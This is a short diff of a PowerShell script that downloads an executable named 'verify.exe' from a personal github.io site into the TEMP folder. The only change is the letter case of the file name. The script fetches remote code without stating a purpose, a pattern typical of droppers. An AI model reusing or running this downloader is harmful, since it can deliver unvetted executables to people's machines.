@@ -1,8 +1,8 @@
 
-$exeScriptUrl = "http://mcrobbyyt.github.io/Verify.exe"
+$exeScriptUrl = "http://mcrobbyyt.github.io/verify.exe"
 
 
-$localScriptPath = "$env:TEMP\Verify.exe"
+$localScriptPath = "$env:TEMP\verify.exe"
 
 
 Invoke-WebRequest -Uri $exeScriptUrl -OutFile $localScriptPath
